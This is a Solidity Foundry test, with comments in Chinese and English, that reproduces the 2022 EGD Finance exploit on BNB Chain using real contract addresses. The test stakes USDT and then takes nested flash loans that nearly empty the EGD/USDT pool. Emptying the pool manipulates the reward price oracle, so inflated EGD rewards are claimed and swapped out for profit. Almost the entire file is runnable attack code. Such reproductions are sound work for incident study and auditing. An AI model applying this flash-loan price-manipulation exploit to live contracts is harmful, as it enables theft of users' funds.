// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Test, console} from "forge-std/Test.sol";
import "./interface/Interface.sol";

/* 
@KeyInfo - Total Lost : ~36,044 US$
Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
@Info
Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

Attacker sender : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

EGD_USDT_LPPool : 0xa361433E409Adac1f87CDF133127585F8a93c67d
*/

// 模擬的攻擊者(EOA)
contract Exploit is Test {
    uint256 constant borrow1 = 2000 ether;
    uint256 borrow2;

    IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
    address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address constant egdToken = 0x202b233735bF743FA31abb8f71e641970161bF98;
    address constant attacker = address(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7);
    address constant statkeInvitor = address(0x659b136c49Da3D9ac48682D02F7BD8806184e218);

    function setUp() public {
        // 注意: 必須 fork 攻擊 tx 的前一個 block, 因為此時受害合約狀態尚未改變!!
        // 从stake区块开始
        vm.createSelectFork("bsc", 20245522);

        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egdToken, "EGD");
    }

    function testRegular() public {
        console.log("-------------------------------- Regular ----------------------------------");
        uint256 rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(address(this));
        uint256 EGDBalance = IERC20(egdToken).balanceOf(address(this));

        emit log_named_decimal_uint("Pre reward Balance", rewardBalance, 18);
        emit log_named_decimal_uint("Pre EGDBalance", EGDBalance, 18);

        IEGD_Finance(EGD_Finance).bond(statkeInvitor);
        deal(address(usdt), address(this), 100 ether);
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);

        // stake time stamp 2022-08-07 23:14:52 UTC
        // stake 1 min
        // block.timestamp = 2022-08-07 23:15:46(UTC)
        vm.warp(1659914146);

        rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(address(this));
        emit log_named_decimal_uint("After reward Balance", rewardBalance, 18);

        IEGD_Finance(EGD_Finance).claimAllReward();

        EGDBalance = IERC20(egdToken).balanceOf(address(this));
        emit log_named_decimal_uint("EGDBalance", EGDBalance, 18);
    }

    function testExploit() public {
        console.log("-------------------------------- Exploit ----------------------------------");
        uint256 USDTBalance = IERC20(usdt).balanceOf(address(this));
        uint256 EGDPrice = IEGD_Finance(EGD_Finance).getEGDPrice();
        uint256 EGDReward = IEGD_Finance(EGD_Finance).calculateAll(address(this));

        // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
        emit log_named_decimal_uint("USDT Balance", USDTBalance, 18);
        emit log_named_decimal_uint("EGD/USDT Price before", EGDPrice, 18);
        emit log_named_decimal_uint("Current calculateAll", EGDReward, 18);

        stake();
        // block.timestamp = 2022-08-07 23:15:46(UTC)
        vm.warp(1659914146);
        harvest();

        // console.log("-------------------------------- End Exploit ----------------------------------");
        USDTBalance = IERC20(usdt).balanceOf(address(this));
        emit log_named_decimal_uint("USDT Balance", USDTBalance, 18);
    }

    function harvest() public {
        // borrow 2,000 USDT from USDT/WBNB LPPool reserve
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
    }

    function stake() public {
        // Give exploit contract 100 USDT
        deal(address(usdt), address(this), 100 ether);
        // Set invitor
        IEGD_Finance(EGD_Finance).bond(statkeInvitor);
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // Flashloan[1]
        if (keccak256(data) == keccak256("0000")) {
            // borrow 2000 usdt
            emit log_named_decimal_uint("Before flashswap, usdt balance:", IERC20(usdt).balanceOf(address(this)), 18);

            // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000;
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            address[] memory path = new address[](2);
            path[0] = egdToken;
            path[1] = usdt;
            IERC20(egdToken).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egdToken).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );

            // 闪电贷回款 USDT
            uint256 fee = ((amount0 * 5) / 1000);
            uint256 amountToRepay = amount0 + fee;
            emit log_named_decimal_uint("Amount to repay:", amountToRepay, 18);

            // 攻擊者還款 2,000 USDT + 0.5% 服務費
            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), amountToRepay);
            require(suc, "Flashloan[1] payback failed");
        } else {
            // Flashloan[2]
            uint256 EGDPrice = IEGD_Finance(EGD_Finance).getEGDPrice();
            emit log_named_decimal_uint("EGD/USDT Price after", EGDPrice, 18);

            // Claim all EGD Token reward from EGD Finance contract
            IEGD_Finance(EGD_Finance).claimAllReward();

            uint256 egdTokenBalance = IERC20(egdToken).balanceOf(address(this));
            emit log_named_decimal_uint("Get reward (EGD token)", egdTokenBalance, 18);

            // Attacker needs to pay >0.25% fee back to Pancakeswap
            // 424,456,221,210,335,857,574,110 loan
            // 425,729,589,873,966,865,146,832 back
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), (amount1 * 10_000 / 9970));
            require(suc, "Flashloan[2] payback failed");
        }
    }
}
